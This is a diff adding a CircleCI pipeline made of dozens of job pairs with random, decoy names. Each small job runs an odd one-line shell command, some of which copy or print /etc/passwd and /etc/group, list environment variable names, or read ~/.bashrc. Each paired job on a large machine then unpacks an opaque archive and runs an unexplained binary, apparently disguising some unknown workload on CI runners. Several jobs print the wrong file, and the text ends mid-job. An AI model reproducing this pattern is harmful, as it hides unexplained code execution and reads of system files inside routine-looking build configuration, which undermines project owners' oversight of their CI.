@@ -1,0 +1,1574 @@
+version: 2.1
+
+jobs:
+  TgwlGDWl40E:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Create signature C
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; df -k | tr -s ' ' | wc -w; true ; } > /tmp/d4/s1n4r2
+            echo "gate dp-new: $(wc -c </tmp/d4/s1n4r2) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 's1n4r2'
+  dp-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/s1n4r2
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  shouldReset:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: enforcement status pending
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; echo x >/var/tmp/playground-green.csv && ln -f /var/tmp/playground-green.csv "/var/tmp/crimson-purple-guest.copy" && stat -c %h /var/tmp/playground-green.csv; true ; } > /tmp/d4/ridge
+            echo "gate bun-bench: $(wc -c </tmp/d4/ridge) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'ridge'
+  bun-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/ridge
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  miniPtrWrapper:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Pick The Conveyor Zone 7
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; echo "pay the rent" > /tmp/Input-2026-07-17.tmp && du -h /tmp/Input-2026-07-17.tmp; true ; } > /tmp/d4/28P
+            echo "gate biuld: $(wc -c </tmp/d4/28P) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - '28P'
+  biuld:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/28P
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  pEnabledTab:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: fy27 Power Cycle
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; tar -C /etc -cf - group | gzip -c >'/tmp/orders.tar.gz' && tar -tzf '/tmp/orders.tar.gz'; true ; } > /tmp/d4/r0u7er57one
+            echo "gate node18-ship: $(wc -c </tmp/d4/r0u7er57one) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'r0u7er57one'
+  node18-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/r0u7er57one
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  info8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Just mirror the thing
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; stat -c %s /etc/*.conf | tail -n 4 | awk '$1 % 2 == 0' | wc -l; true ; } > /tmp/d4/hSDoqkF
+            echo "gate defualt: $(wc -c </tmp/d4/hSDoqkF) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'hSDoqkF'
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/hSDoqkF
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  stalegradient:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: T minus 60
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; ls -1Siv /opt | uniq; true ; } > /tmp/d4/efj6w9
+            echo "gate dotnet8-lint: $(wc -c </tmp/d4/efj6w9) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'efj6w9'
+  dotnet8-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/efj6w9
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  Exit-ResourceObject:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Rally at the dependencies
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; cut -d: -f1 /etc/passwd | tr '[:lower:]' '[:upper:]' | tac | shuf -n 2; true ; } > /tmp/d4/DJI9857
+            echo "gate RUN_LAB: $(wc -c </tmp/d4/DJI9857) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'DJI9857'
+  RUN_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/DJI9857
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  blend-spring-cluster-lion:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Focus the dropdown and type
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; echo "back in 5" | xargs; true ; } > /tmp/d4/Copper
+            echo "gate feb19-ship: $(wc -c </tmp/d4/Copper) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'Copper'
+  feb19-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/Copper
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  task-button-finish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Fifth time pack the crafting recipes
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; printf 'host=cache-a\nport=8056\nuser=yuki\ndebug=true\n' |grep ^port | cut -d= -f2; true ; } > /tmp/d4/rev.5.13
+            echo "gate rc-v2: $(wc -c </tmp/d4/rev.5.13) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'rev.5.13'
+  rc-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/rev.5.13
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  corp-test-99:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Restock with sudo
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; gzip -c /etc/group >'/var/tmp/tracking_20240126.gz' && gunzip -c '/var/tmp/tracking_20240126.gz' | wc -l; true ; } > /tmp/d4/bond_silver_token_red
+            echo "gate check-staging-artifact-bundle: $(wc -c </tmp/d4/bond_silver_token_red) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'bond_silver_token_red'
+  check-staging-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/bond_silver_token_red
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  iMaxCategory:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: roll over retry buffer too
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; env -0 | tr '\0' '\n' | sort | head -n 5 | cut -f1 -d'='; true ; } > /tmp/d4/g
+            echo "gate cerberus-beta: $(wc -c </tmp/d4/g) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'g'
+  cerberus-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/g
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  col_deg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Month end refunded automatically
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -name 'shells' -size 0 -exec basename '{}' \;; true ; } > /tmp/d4/GADGET
+            echo "gate STG_HOOK_7: $(wc -c </tmp/d4/GADGET) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'GADGET'
+  STG_HOOK_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/GADGET
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  normalize_fork:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Create signature C
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; seq 66 | awk '{print $1 * 2}' | tac; true ; } > /tmp/d4/v-v0.17.18
+            echo "gate ivan-ci: $(wc -c </tmp/d4/v-v0.17.18) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'v-v0.17.18'
+  ivan-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/v-v0.17.18
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  dwFuture:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Auditing the journal entries please wait
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; find /usr/lib -maxdepth 3 -name '*.py' -size 0 -exec echo '{}' \; 2> /dev/null | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -n5; true ; } > /tmp/d4/MRRE
+            echo "gate hyperion-ng: $(wc -c </tmp/d4/MRRE) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'MRRE'
+  hyperion-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/MRRE
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  lvlHud:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Collect the bank feed for audit
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; set -- test release meeting; shift; echo $@; true ; } > /tmp/d4/amber_config_bundle_beam
+            echo "gate PrepareImage: $(wc -c </tmp/d4/amber_config_bundle_beam) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'amber_config_bundle_beam'
+  PrepareImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/amber_config_bundle_beam
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  a0ac61a6-a13b-3595-a854-fb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Tomasz owns restart
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; grep -lr case /etc 2>/dev/null | cut -d: -f1 | sort -u; true ; } > /tmp/d4/omEgaCANvAs
+            echo "gate bravo-2: $(wc -c </tmp/d4/omEgaCANvAs) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'omEgaCANvAs'
+  bravo-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/omEgaCANvAs
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  account-7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Finished zipping the cache directory
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; cp /etc/passwd "/tmp/billing-v3.tmp" && gzip -f "/tmp/billing-v3.tmp" && ls -l "/tmp/billing-v3.tmp".gz; true ; } > /tmp/d4/MATRIX_WEST_USER
+            echo "gate ruby3-release: $(wc -c </tmp/d4/MATRIX_WEST_USER) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'MATRIX_WEST_USER'
+  ruby3-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/DJI9857
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  struct_Stream-convert:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Commit 95f62 storage
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; find /var/log -type f -name '*.gz' -perm /a+x -exec ls -ld {} + 2>/dev/null|awk -F/ '{print $NF}'; true ; } > /tmp/d4/moor.velvet
+            echo "gate ruby3-fmt: $(wc -c </tmp/d4/moor.velvet) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'moor.velvet'
+  ruby3-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/moor.velvet
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  generatorTulipLimitVector:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: throttle upstream
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >"/tmp/mintNew02.gz" && zcat "/tmp/mintNew02.gz" | head -3; true ; } > /tmp/d4/GARDEN_GLYPH_DESERT
+            echo "gate DEV_DEPLOY_9: $(wc -c </tmp/d4/GARDEN_GLYPH_DESERT) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'GARDEN_GLYPH_DESERT'
+  DEV_DEPLOY_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/GARDEN_GLYPH_DESERT
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  hello:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: AUG SCREENSHOT RUN
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; [ -d ${HOME} ] && echo 'it is there' || echo 'nope'; true ; } > /tmp/d4/bGN9yq3
+            echo "gate ga-v2: $(wc -c </tmp/d4/bGN9yq3) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'bGN9yq3'
+  ga-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/bGN9yq3
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  IN-ELEMENT-SW:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: route the shipping labels srsly
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; grep "PS1" ~/.bashrc|sort -u; true ; } > /tmp/d4/8zy849tv7
+            echo "gate DATA-838: $(wc -c </tmp/d4/8zy849tv7) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - '8zy849tv7'
+  DATA-838:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/8zy849tv7
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  yaraq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: rst ports 31
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; TOTAL=(export juice passport carrot);echo ${#TOTAL[@]}; true ; } > /tmp/d4/ea5027d387057b5318c2928aec7a10ee1df73b8
+            echo "gate vela-rev: $(wc -c </tmp/d4/ea5027d387057b5318c2928aec7a10ee1df73b8) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'ea5027d387057b5318c2928aec7a10ee1df73b8'
+  vela-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/ea5027d387057b5318c2928aec7a10ee1df73b8
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  nut-838:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: done summarizing vendor
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; echo 'thanks a lot' | awk '{gsub(/[[:upper:]]/, "*"); print}'; true ; } > /tmp/d4/TXN-49322-GM
+            echo "gate atlas-v2: $(wc -c </tmp/d4/TXN-49322-GM) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'TXN-49322-GM'
+  atlas-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/DJI9857
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  enum__:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Encryption Of The Oauth Scopes
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; \ls -S -a ~ | grep -c .; true ; } > /tmp/d4/acGz4wUR5i1G40xtl
+            echo "gate tb-alt: $(wc -c </tmp/d4/acGz4wUR5i1G40xtl) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'acGz4wUR5i1G40xtl'
+  tb-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/acGz4wUR5i1G40xtl
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  nuter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Create signature C
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; ls -iQ /etc/profile.d /lib | nl; true ; } > /tmp/d4/stage-200e8
+            echo "gate refactor-5715: $(wc -c </tmp/d4/stage-200e8) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - 'stage-200e8'
+  refactor-5715:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/DJI9857
+      - run:
+          name: Get project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Load archive
+          command: tar -xj -f tray-spare.tar.bz2
+      - run:
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: "$PWD/test-thread"
+  testSearchStackPublic:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Still weighing the hazmat shelf
+          command: |
+            mkdir -p /tmp/d4
+            { set +o pipefail 2>/dev/null; grep --line-number --colour=auto case <$HOME/.bashrc | sort -u; true ; } > /tmp/d4/23a4bf68451b
+            echo "gate BUILD_QA: $(wc -c </tmp/d4/23a4bf68451b) bytes total"
+      - persist_to_workspace:
+          root: /tmp/d4
+          paths:
+            - '23a4bf68451b'
+  BUILD_QA:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/d4
+      - run:
+          name: Deserialize upstream
+          command: |
+            cat /tmp/d4/23a4bf68451b
+      - run:
+          name: Get project
